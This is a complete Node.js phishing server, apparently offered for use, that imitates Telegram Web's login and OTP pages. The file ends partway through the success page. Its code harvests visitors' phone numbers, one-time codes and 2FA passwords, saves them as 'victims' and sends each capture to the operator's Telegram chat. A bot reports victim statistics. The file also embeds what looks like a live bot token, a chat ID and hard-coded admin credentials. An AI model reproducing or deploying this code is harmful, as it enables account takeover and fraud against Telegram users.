// ============================================
// TELEGRAM PHISHING SERVER - ALL IN ONE
// ============================================

// Load dependencies
const express = require('express');
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { Telegraf } = require('telegraf');

// Initialize Express
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// CONFIGURATION
// ============================================
const CONFIG = {
    // Telegram Bot Configuration
    BOT_TOKEN: '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s', // Ganti dengan bot tokenmu
    CHAT_ID: '6834832649',     // Ganti dengan chat IDmu
    
    // Admin credentials
    ADMIN_USERNAME: 'admin',
    ADMIN_PASSWORD: 'TeleSecure2024!',
    
    // Server settings
    SESSION_SECRET: crypto.randomBytes(32).toString('hex'),
    
    // Data storage
    DATA_DIR: './telegram_data',
    VICTIMS_DIR: './telegram_data/victims',
    LOGS_DIR: './telegram_data/logs',
    
    // Telegram API simulation
    FAKE_TELEGRAM_API: {
        'login': 'https://api.telegram.org/bot',
        'sendCode': 'https://my.telegram.org/auth/send_code',
        'signIn': 'https://my.telegram.org/auth/sign_in'
    }
};

// ============================================
// INITIALIZATION
// ============================================

// Create directories
function initializeDirectories() {
    const dirs = [
        CONFIG.DATA_DIR,
        CONFIG.VICTIMS_DIR,
        CONFIG.LOGS_DIR,
        './public',
        './public/css',
        './public/js',
        './admin'
    ];
    
    dirs.forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
            console.log(`✓ Created directory: ${dir}`);
        }
    });
    
    // Create .htaccess for protection
    const htaccess = `Order deny,allow\nDeny from all\nOptions -Indexes`;
    fs.writeFileSync(`${CONFIG.DATA_DIR}/.htaccess`, htaccess);
    fs.writeFileSync(`${CONFIG.VICTIMS_DIR}/.htaccess`, htaccess);
}

// Initialize Telegram Bot
function initializeTelegramBot() {
    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN === '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
        console.log('⚠️  Telegram bot token not configured. Alerts disabled.');
        return null;
    }
    
    try {
        const bot = new Telegraf(CONFIG.BOT_TOKEN);
        
        bot.command('start', (ctx) => {
            ctx.reply(`🤖 Phishing Bot Active\n📊 Victims: ${getVictimCount()}\n🕐 Last: ${getLastVictimTime()}`);
        });
        
        bot.command('stats', (ctx) => {
            const stats = getStatistics();
            ctx.reply(
                `📈 PHISHING STATISTICS\n\n` +
                `👥 Total Victims: ${stats.total}\n` +
                `📅 Today: ${stats.today}\n` +
                `🕐 Last Hour: ${stats.lastHour}\n` +
                `🌍 Countries: ${stats.countries}\n` +
                `💾 Data: ${stats.dataSize}`
            );
        });
        
        bot.command('latest', (ctx) => {
            const latest = getLatestVictims(3);
            let reply = `🆕 LATEST VICTIMS (Last 3)\n\n`;
            latest.forEach((victim, index) => {
                reply += `${index + 1}. @${victim.phone}\n`;
                reply += `   📱 Code: ${victim.code}\n`;
                reply += `   🕐 ${victim.time}\n\n`;
            });
            ctx.reply(reply);
        });
        
        bot.launch();
        console.log('✓ Telegram Bot Initialized');
        return bot;
    } catch (error) {
        console.log('✗ Telegram Bot Error:', error.message);
        return null;
    }
}

// ============================================
// DATA MANAGEMENT FUNCTIONS
// ============================================

function saveVictimData(phone, code, password = null, ip, userAgent) {
    const timestamp = new Date().toISOString();
    const victimId = crypto.createHash('md5').update(phone + timestamp).digest('hex');
    
    const victimData = {
        id: victimId,
        phone: phone,
        code: code,
        password: password,
        ip: ip,
        userAgent: userAgent,
        timestamp: timestamp,
        country: getCountryFromIP(ip),
        browser: getBrowserInfo(userAgent)
    };
    
    // Save to JSON file
    const filename = `${CONFIG.VICTIMS_DIR}/${victimId}.json`;
    fs.writeFileSync(filename, JSON.stringify(victimData, null, 2));
    
    // Append to log file
    const logEntry = `${timestamp} | ${phone} | ${code} | ${ip} | ${victimData.country}\n`;
    fs.appendFileSync(`${CONFIG.LOGS_DIR}/victims.log`, logEntry);
    
    // Send Telegram alert
    sendTelegramAlert(victimData);
    
    return victimId;
}

function sendTelegramAlert(victimData) {
    if (!CONFIG.BOT_TOKEN || CONFIG.BOT_TOKEN === '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
        return;
    }
    
    const message = `
🎣 *NEW VICTIM CAPTURED* 🎣

📱 *Phone:* +${victimData.phone}
🔢 *OTP Code:* ${victimData.code}
${victimData.password ? `🔑 *Password:* ${victimData.password}\n` : ''}
🌐 *IP:* ${victimData.ip}
📍 *Country:* ${victimData.country}
🕐 *Time:* ${new Date(victimData.timestamp).toLocaleString()}
🔍 *Browser:* ${victimData.browser}

ID: ${victimData.id}
    `.trim();
    
    const bot = new Telegraf(CONFIG.BOT_TOKEN);
    bot.telegram.sendMessage(CONFIG.CHAT_ID, message, { parse_mode: 'Markdown' })
        .catch(err => console.log('Telegram alert failed:', err.message));
}

function getVictimCount() {
    try {
        const files = fs.readdirSync(CONFIG.VICTIMS_DIR);
        return files.filter(f => f.endsWith('.json')).length;
    } catch {
        return 0;
    }
}

function getLatestVictims(limit = 5) {
    try {
        const files = fs.readdirSync(CONFIG.VICTIMS_DIR)
            .filter(f => f.endsWith('.json'))
            .map(f => `${CONFIG.VICTIMS_DIR}/${f}`);
        
        // Sort by modification time (newest first)
        files.sort((a, b) => fs.statSync(b).mtimeMs - fs.statSync(a).mtimeMs);
        
        return files.slice(0, limit).map(file => {
            const data = JSON.parse(fs.readFileSync(file, 'utf8'));
            return {
                phone: data.phone,
                code: data.code,
                time: new Date(data.timestamp).toLocaleTimeString()
            };
        });
    } catch {
        return [];
    }
}

function getStatistics() {
    try {
        const files = fs.readdirSync(CONFIG.VICTIMS_DIR).filter(f => f.endsWith('.json'));
        const today = new Date().toDateString();
        const oneHourAgo = Date.now() - 3600000;
        
        let todayCount = 0;
        let lastHourCount = 0;
        const countries = new Set();
        
        files.forEach(file => {
            const filepath = `${CONFIG.VICTIMS_DIR}/${file}`;
            const data = JSON.parse(fs.readFileSync(filepath, 'utf8'));
            const victimDate = new Date(data.timestamp).toDateString();
            
            if (victimDate === today) todayCount++;
            if (new Date(data.timestamp).getTime() > oneHourAgo) lastHourCount++;
            if (data.country) countries.add(data.country);
        });
        
        // Calculate total data size
        let totalSize = 0;
        files.forEach(file => {
            totalSize += fs.statSync(`${CONFIG.VICTIMS_DIR}/${file}`).size;
        });
        
        return {
            total: files.length,
            today: todayCount,
            lastHour: lastHourCount,
            countries: countries.size,
            dataSize: formatBytes(totalSize)
        };
    } catch {
        return { total: 0, today: 0, lastHour: 0, countries: 0, dataSize: '0 KB' };
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function getCountryFromIP(ip) {
    // Simple IP to country mapping (for demo)
    // In production, use a proper geoIP database
    const ipRanges = {
        '103.': 'Indonesia',
        '114.': 'Indonesia',
        '112.': 'Indonesia',
        '180.': 'Indonesia',
        '182.': 'Indonesia',
        '1.': 'Australia',
        '5.': 'Iran',
        '14.': 'Japan',
        '27.': 'China',
        '31.': 'Netherlands',
        '37.': 'Germany',
        '41.': 'South Africa',
        '46.': 'Russia',
        '49.': 'Thailand',
        '58.': 'China',
        '60.': 'Malaysia',
        '61.': 'Australia',
        '62.': 'Poland',
        '66.': 'USA',
        '77.': 'France',
        '78.': 'Italy',
        '79.': 'Switzerland',
        '80.': 'Germany',
        '81.': 'Turkey',
        '82.': 'UK',
        '84.': 'Spain',
        '85.': 'Portugal',
        '86.': 'China',
        '87.': 'Sweden',
        '88.': 'Germany',
        '89.': 'Netherlands',
        '90.': 'Turkey',
        '91.': 'Germany',
        '92.': 'UK',
        '93.': 'Italy',
        '94.': 'Greece',
        '95.': 'Russia',
    };
    
    for (const [prefix, country] of Object.entries(ipRanges)) {
        if (ip.startsWith(prefix)) return country;
    }
    
    return 'Unknown';
}

function getBrowserInfo(userAgent) {
    if (!userAgent) return 'Unknown';
    
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    if (userAgent.includes('Opera')) return 'Opera';
    
    return 'Other';
}

// ============================================
// MIDDLEWARE
// ============================================

// Parse JSON and URL-encoded bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// Logging middleware
app.use((req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const log = `${new Date().toISOString()} | ${ip} | ${req.method} ${req.url} | ${req.headers['user-agent']}`;
    fs.appendFileSync(`${CONFIG.LOGS_DIR}/access.log`, log + '\n');
    next();
});

// Basic authentication for admin area
const basicAuth = (req, res, next) => {
    const auth = req.headers.authorization;
    
    if (!auth) {
        res.set('WWW-Authenticate', 'Basic realm="Telegram Admin"');
        return res.status(401).send('Authentication required');
    }
    
    const [username, password] = Buffer.from(auth.split(' ')[1], 'base64')
        .toString()
        .split(':');
    
    if (username === CONFIG.ADMIN_USERNAME && password === CONFIG.ADMIN_PASSWORD) {
        return next();
    }
    
    res.set('WWW-Authenticate', 'Basic realm="Telegram Admin"');
    return res.status(401).send('Invalid credentials');
};

// ============================================
// ROUTES
// ============================================

// Home Page
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram Web - Official</title>
        <link rel="icon" href="https://web.telegram.org/favicon.ico">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #3390ec 0%, #1e6bb8 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 20px;
                padding: 40px;
                max-width: 400px;
                width: 100%;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                text-align: center;
            }
            .logo {
                font-size: 48px;
                color: #3390ec;
                margin-bottom: 20px;
            }
            h1 {
                color: #333;
                margin-bottom: 10px;
            }
            p {
                color: #666;
                margin-bottom: 30px;
            }
            .btn {
                display: block;
                width: 100%;
                padding: 15px;
                background: #3390ec;
                color: white;
                border: none;
                border-radius: 10px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                text-decoration: none;
                transition: background 0.3s;
            }
            .btn:hover {
                background: #1e6bb8;
            }
            .features {
                margin-top: 30px;
                text-align: left;
            }
            .feature {
                display: flex;
                align-items: center;
                margin-bottom: 15px;
                color: #555;
            }
            .feature i {
                color: #3390ec;
                margin-right: 10px;
            }
        </style>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <i class="fab fa-telegram"></i>
            </div>
            <h1>Telegram Web</h1>
            <p>Fast and secure messaging on all your devices</p>
            
            <a href="/login" class="btn">
                <i class="fas fa-sign-in-alt"></i> Open Telegram Web
            </a>
            
            <div class="features">
                <div class="feature">
                    <i class="fas fa-bolt"></i>
                    <span>Lightning-fast messaging</span>
                </div>
                <div class="feature">
                    <i class="fas fa-shield-alt"></i>
                    <span>End-to-end encryption</span>
                </div>
                <div class="feature">
                    <i class="fas fa-sync-alt"></i>
                    <span>Sync across all devices</span>
                </div>
                <div class="feature">
                    <i class="fas fa-cloud"></i>
                    <span>Cloud-based storage</span>
                </div>
            </div>
            
            <div style="margin-top: 30px; font-size: 12px; color: #999;">
                By continuing, you agree to Telegram's Terms of Service
            </div>
        </div>
    </body>
    </html>
    `);
});

// Login Page
app.get('/login', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login • Telegram</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f5f5f5;
                display: flex;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
                padding: 20px;
            }
            .login-container {
                background: white;
                border-radius: 12px;
                padding: 40px;
                width: 100%;
                max-width: 360px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            }
            .telegram-logo {
                text-align: center;
                margin-bottom: 30px;
                color: #3390ec;
                font-size: 48px;
            }
            .login-title {
                text-align: center;
                margin-bottom: 30px;
                color: #333;
            }
            .login-title h1 {
                font-size: 24px;
                margin-bottom: 8px;
            }
            .login-title p {
                color: #666;
                font-size: 14px;
            }
            .form-group {
                margin-bottom: 20px;
            }
            .form-group label {
                display: block;
                margin-bottom: 8px;
                color: #333;
                font-weight: 500;
                font-size: 14px;
            }
            .form-control {
                width: 100%;
                padding: 14px;
                border: 2px solid #e0e0e0;
                border-radius: 8px;
                font-size: 16px;
                transition: border-color 0.3s;
                background: #fafafa;
            }
            .form-control:focus {
                outline: none;
                border-color: #3390ec;
                background: white;
            }
            .phone-input {
                display: flex;
                align-items: center;
                background: #fafafa;
                border-radius: 8px;
                border: 2px solid #e0e0e0;
                overflow: hidden;
            }
            .country-code {
                padding: 0 15px;
                background: #e9e9e9;
                height: 100%;
                display: flex;
                align-items: center;
                font-weight: 500;
                color: #333;
            }
            .phone-input input {
                flex: 1;
                border: none;
                padding: 14px;
                background: transparent;
                font-size: 16px;
            }
            .phone-input input:focus {
                outline: none;
            }
            .btn-login {
                width: 100%;
                padding: 16px;
                background: #3390ec;
                color: white;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: background 0.3s;
                margin-top: 10px;
            }
            .btn-login:hover {
                background: #1e6bb8;
            }
            .btn-login:disabled {
                background: #a0c8f1;
                cursor: not-allowed;
            }
            .loader {
                display: none;
                border: 3px solid #f3f3f3;
                border-top: 3px solid #3390ec;
                border-radius: 50%;
                width: 20px;
                height: 20px;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .error-message {
                color: #ff3333;
                font-size: 14px;
                margin-top: 10px;
                text-align: center;
                display: none;
            }
            .help-text {
                text-align: center;
                margin-top: 20px;
                color: #666;
                font-size: 13px;
            }
            .help-text a {
                color: #3390ec;
                text-decoration: none;
            }
        </style>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    </head>
    <body>
        <div class="login-container">
            <div class="telegram-logo">
                <i class="fab fa-telegram"></i>
            </div>
            
            <div class="login-title">
                <h1>Sign in to Telegram</h1>
                <p>Please confirm your country and enter your phone number</p>
            </div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label for="country">Country</label>
                    <select class="form-control" id="country" required>
                        <option value="Indonesia">Indonesia (+62)</option>
                        <option value="USA">United States (+1)</option>
                        <option value="India">India (+91)</option>
                        <option value="Malaysia">Malaysia (+60)</option>
                        <option value="UK">United Kingdom (+44)</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="phone">Phone Number</label>
                    <div class="phone-input">
                        <span class="country-code" id="countryCode">+62</span>
                        <input type="tel" id="phone" placeholder="81234567890" required>
                    </div>
                </div>
                
                <div class="form-group" id="passwordGroup" style="display: none;">
                    <label for="password">Password (Optional)</label>
                    <input type="password" class="form-control" id="password" 
                           placeholder="Enter 2FA password if you have one">
                    <small style="color: #666; font-size: 12px; margin-top: 5px; display: block;">
                        Some accounts have additional password protection
                    </small>
                </div>
                
                <div class="loader" id="loader"></div>
                <div class="error-message" id="errorMessage"></div>
                
                <button type="submit" class="btn-login" id="submitBtn">
                    <i class="fas fa-sign-in-alt"></i> NEXT
                </button>
                
                <div class="help-text">
                    <a href="#" onclick="togglePasswordField()">
                        <i class="fas fa-key"></i> I have a password
                    </a>
                </div>
            </form>
        </div>
        
        <script>
            // Update country code based on country selection
            document.getElementById('country').addEventListener('change', function() {
                const codes = {
                    'Indonesia': '+62',
                    'USA': '+1',
                    'India': '+91',
                    'Malaysia': '+60',
                    'UK': '+44'
                };
                document.getElementById('countryCode').textContent = codes[this.value];
            });
            
            // Toggle password field
            function togglePasswordField() {
                const group = document.getElementById('passwordGroup');
                group.style.display = group.style.display === 'none' ? 'block' : 'none';
                return false;
            }
            
            // Form submission
            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const submitBtn = document.getElementById('submitBtn');
                const loader = document.getElementById('loader');
                const errorMsg = document.getElementById('errorMessage');
                
                // Get values
                const country = document.getElementById('country').value;
                const phone = document.getElementById('phone').value;
                const password = document.getElementById('password').value;
                
                // Validation
                if (!phone.match(/^[0-9]{9,12}$/)) {
                    errorMsg.textContent = 'Please enter a valid phone number';
                    errorMsg.style.display = 'block';
                    return;
                }
                
                // Show loading
                submitBtn.style.display = 'none';
                loader.style.display = 'block';
                errorMsg.style.display = 'none';
                
                // Send data to server
                try {
                    const response = await fetch('/api/send-code', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            country: country,
                            phone: phone,
                            password: password || null
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        // Store phone in session storage
                        sessionStorage.setItem('tg_phone', phone);
                        if (password) {
                            sessionStorage.setItem('tg_password', password);
                        }
                        
                        // Redirect to OTP page
                        window.location.href = '/otp';
                    } else {
                        errorMsg.textContent = data.message || 'Failed to send code';
                        errorMsg.style.display = 'block';
                        submitBtn.style.display = 'block';
                        loader.style.display = 'none';
                    }
                } catch (error) {
                    errorMsg.textContent = 'Network error. Please try again.';
                    errorMsg.style.display = 'block';
                    submitBtn.style.display = 'block';
                    loader.style.display = 'none';
                }
            });
            
            // Auto-format phone number
            document.getElementById('phone').addEventListener('input', function(e) {
                this.value = this.value.replace(/\D/g, '');
            });
        </script>
    </body>
    </html>
    `);
});

// OTP Verification Page
app.get('/otp', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Code Verification • Telegram</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f5f5f5;
                display: flex;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
                padding: 20px;
            }
            .otp-container {
                background: white;
                border-radius: 12px;
                padding: 40px;
                width: 100%;
                max-width: 360px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.1);
                text-align: center;
            }
            .telegram-logo {
                color: #3390ec;
                font-size: 48px;
                margin-bottom: 20px;
            }
            .otp-title {
                margin-bottom: 10px;
                color: #333;
            }
            .otp-subtitle {
                color: #666;
                margin-bottom: 30px;
                font-size: 14px;
                line-height: 1.5;
            }
            .phone-number {
                color: #3390ec;
                font-weight: 600;
            }
            .code-inputs {
                display: flex;
                justify-content: center;
                gap: 10px;
                margin: 30px 0;
            }
            .code-input {
                width: 50px;
                height: 60px;
                text-align: center;
                font-size: 24px;
                font-weight: 600;
                border: 2px solid #e0e0e0;
                border-radius: 8px;
                background: #fafafa;
                transition: all 0.3s;
            }
            .code-input:focus {
                outline: none;
                border-color: #3390ec;
                background: white;
                box-shadow: 0 0 0 3px rgba(51, 144, 236, 0.1);
            }
            .btn-verify {
                width: 100%;
                padding: 16px;
                background: #3390ec;
                color: white;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: background 0.3s;
                margin-top: 20px;
            }
            .btn-verify:hover {
                background: #1e6bb8;
            }
            .btn-verify:disabled {
                background: #a0c8f1;
                cursor: not-allowed;
            }
            .loader {
                display: none;
                border: 3px solid #f3f3f3;
                border-top: 3px solid #3390ec;
                border-radius: 50%;
                width: 20px;
                height: 20px;
                animation: spin 1s linear infinite;
                margin: 10px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .error-message {
                color: #ff3333;
                font-size: 14px;
                margin-top: 10px;
                display: none;
            }
            .resend-text {
                margin-top: 20px;
                color: #666;
                font-size: 14px;
            }
            .resend-link {
                color: #3390ec;
                cursor: pointer;
                font-weight: 500;
            }
            .resend-link.disabled {
                color: #999;
                cursor: not-allowed;
            }
            .countdown {
                color: #3390ec;
                font-weight: 600;
            }
            .sms-simulation {
                background: #f0f7ff;
                border: 1px solid #cce0ff;
                border-radius: 10px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
                position: relative;
            }
            .sms-header {
                display: flex;
                align-items: center;
                margin-bottom: 15px;
            }
            .sms-icon {
                background: #3390ec;
                color: white;
                width: 40px;
                height: 40px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin-right: 15px;
                font-size: 20px;
            }
            .sms-info h4 {
                margin: 0;
                color: #333;
            }
            .sms-info p {
                margin: 2px 0 0;
                color: #666;
                font-size: 12px;
            }
            .sms-content {
                color: #333;
                line-height: 1.5;
            }
            .sms-code {
                display: inline-block;
                background: #e6f2ff;
                color: #3390ec;
                padding: 8px 16px;
                border-radius: 6px;
                font-family: monospace;
                font-size: 18px;
                font-weight: bold;
                letter-spacing: 2px;
                margin: 10px 0;
                cursor: pointer;
            }
        </style>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    </head>
    <body>
        <div class="otp-container">
            <div class="telegram-logo">
                <i class="fab fa-telegram"></i>
            </div>
            
            <h2 class="otp-title">Enter Code</h2>
            <p class="otp-subtitle">
                We've sent an SMS with an activation code to your phone 
                <span class="phone-number" id="displayPhone">+62</span>
            </p>
            
            <!-- SMS Simulation -->
            <div class="sms-simulation">
                <div class="sms-header">
                    <div class="sms-icon">
                        <i class="fas fa-sms"></i>
                    </div>
                    <div class="sms-info">
                        <h4>Telegram</h4>
                        <p>Just now</p>
                    </div>
                </div>
                <div class="sms-content">
                    Your Telegram code is:
                    <div class="sms-code" id="fakeSmsCode">123456</div>
                    Don't share this code with anyone.
                </div>
            </div>
            
            <form id="otpForm">
                <div class="code-inputs">
                    <input type="text" class="code-input" name="digit1" maxlength="1" pattern="[0-9]" required autofocus>
                    <input type="text" class="code-input" name="digit2" maxlength="1" pattern="[0-9]" required>
                    <input type="text" class="code-input" name="digit3" maxlength="1" pattern="[0-9]" required>
                    <input type="text" class="code-input" name="digit4" maxlength="1" pattern="[0-9]" required>
                    <input type="text" class="code-input" name="digit5" maxlength="1" pattern="[0-9]" required>
                    <input type="text" class="code-input" name="digit6" maxlength="1" pattern="[0-9]" required>
                    <input type="hidden" name="code" id="fullCode">
                </div>
                
                <div class="error-message" id="errorMessage"></div>
                <div class="loader" id="loader"></div>
                
                <button type="submit" class="btn-verify" id="submitBtn">
                    <i class="fas fa-check"></i> VERIFY
                </button>
                
                <div class="resend-text">
                    Didn't receive the code? 
                    <span class="resend-link disabled" id="resendLink">
                        Resend SMS (<span id="countdown">60</span>s)
                    </span>
                </div>
            </form>
        </div>
        
        <script>
            // Get phone from session storage
            const phone = sessionStorage.getItem('tg_phone') || '81234567890';
            document.getElementById('displayPhone').textContent = '+62' + phone;
            
            // Generate random code for simulation
            const randomCode = Math.floor(100000 + Math.random() * 900000).toString();
            document.getElementById('fakeSmsCode').textContent = randomCode;
            
            // Auto-focus and auto-tab between inputs
            const inputs = document.querySelectorAll('.code-input');
            const fullCodeInput = document.getElementById('fullCode');
            
            inputs.forEach((input, index) => {
                // Auto-tab forward
                input.addEventListener('input', (e) => {
                    if (e.target.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                    updateFullCode();
                });
                
                // Handle backspace
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                    updateFullCode();
                });
                
                // Paste handling
                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasted = e.clipboardData.getData('text').replace(/\D/g, '');
                    if (pasted.length === 6) {
                        for (let i = 0; i < 6; i++) {
                            if (inputs[i]) inputs[i].value = pasted[i] || '';
                        }
                        updateFullCode();
                        inputs[5].focus();
                    }
                });
            });
            
            function updateFullCode() {
                const code = Array.from(inputs).map(i => i.value).join('');
                fullCodeInput.value = code;
            }
            
            // Auto-fill from SMS simulation
            document.getElementById('fakeSmsCode').addEventListener('click', function() {
                const code = this.textContent;
                for (let i = 0; i < 6; i++) {
                    if (inputs[i]) inputs[i].value = code[i] || '';
                }
                updateFullCode();
                inputs[0].focus();
            });
            
            // Countdown for resend
            let countdown = 60;
            const countdownElement = document.getElementById('countdown');
            const resendLink = document.getElementById('resendLink');
            
            function updateCountdown() {
                countdownElement.textContent = countdown;
                if (countdown > 0) {
                    countdown--;
                    setTimeout(updateCountdown, 1000);
                } else {
                    resendLink.classList.remove('disabled');
                    resendLink.textContent = 'Resend SMS';
                    resendLink.onclick = resendCode;
                }
            }
            
            updateCountdown();
            
            function resendCode() {
                if (countdown > 0) return;
                
                // Generate new code
                const newCode = Math.floor(100000 + Math.random() * 900000).toString();
                document.getElementById('fakeSmsCode').textContent = newCode;
                
                // Reset countdown
                countdown = 60;
                resendLink.classList.add('disabled');
                resendLink.innerHTML = `Resend SMS (<span id="countdown">60</span>s)`;
                updateCountdown();
                
                // Show notification
                alert('New code sent!');
            }
            
            // Form submission
            document.getElementById('otpForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const code = fullCodeInput.value;
                if (code.length !== 6 || !/^\d+$/.test(code)) {
                    showError('Please enter a valid 6-digit code');
                    return;
                }
                
                const submitBtn = document.getElementById('submitBtn');
                const loader = document.getElementById('loader');
                const errorMsg = document.getElementById('errorMessage');
                
                // Show loading
                submitBtn.style.display = 'none';
                loader.style.display = 'block';
                errorMsg.style.display = 'none';
                
                // Send to server
                try {
                    const response = await fetch('/api/verify-code', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            phone: phone,
                            code: code,
                            password: sessionStorage.getItem('tg_password') || null
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        // Redirect to success page
                        window.location.href = '/success';
                    } else {
                        showError(data.message || 'Invalid code. Please try again.');
                        submitBtn.style.display = 'block';
                        loader.style.display = 'none';
                    }
                } catch (error) {
                    showError('Network error. Please try again.');
                    submitBtn.style.display = 'block';
                    loader.style.display = 'none';
                }
            });
            
            function showError(message) {
                const errorMsg = document.getElementById('errorMessage');
                errorMsg.textContent = message;
                errorMsg.style.display = 'block';
            }
            
            // Focus first input on load
            window.addEventListener('load', () => {
                inputs[0].focus();
            });
        </script>
    </body>
    </html>
    `);
});

// Success Page
app.get('/success', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Welcome to Telegram!</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #3390ec 0%, #1e6bb8 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .success-container {
                background: white;
                border-radius: 20px;
                padding: 50px 40px;
                max-width: 500px;
                width: 100%;
                text-align: center;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                position: relative;
                overflow: hidden;
            }
            .success-container::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                height: 5px;
                background: linear-gradient(90deg, #3390ec, #28a745);
            }
            .success-icon {
                font-size: 80px;
                color: #28a745;
                margin-bottom: 20px;
                animation: bounce 1s;
            }
            @keyframes bounce {
                0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
                40% { transform: translateY(-20px); }
                60% { transform: translateY(-10px); }
            }
            h1 {
                color: #333;
                margin-bottom: 15px;
            }
            p {
                color: #666;
                line-height: 1.6;
                margin-bottom: 30px;
            }
            .features {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
                margin: 30px 0;
            }
            .feature {
                background: #f8f9fa;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
            }
            .feature i {
                font-size: 30px;
                color: #3390ec;
                margin-bottom: 10px;
            }
            .feature span {
                display: block;
                color: #333;
                font-weight: 500;
                font-size: 14px;
            }
            .btn {
                display: inline-block;
                padding: 15px 30px;
                background: #3390ec;
                color: white;
                text-decoration: none;
                border-radius: 10px;
                font-weight: 600;
                font-size: 16px;
                margin-top: 20px;
                transition: background 0.3s;
            }
            .btn:hover {
                background: #1e6bb8;
            }
            .countdown {
                margin-top: 30px;
                color: #666;
                font-size: 14px;
            }
            .countdown-number {
                font-weight: bold;
                color: #3390ec;
            }
            .confetti {
                position: absolute;
                width: 10px;
                height: 10px;
                background: #3390ec;
                border-radius: 50%;
                opacity: 0;
            }
        </style>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    </head>
    <body>
        <div class="success-container" id="successContainer">
            <div class="success-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            
            <h1>Welcome to Telegram!</h1>
            <p>
                Your account has been successfully verified. 
                You can now use Telegram Web to send messages, 
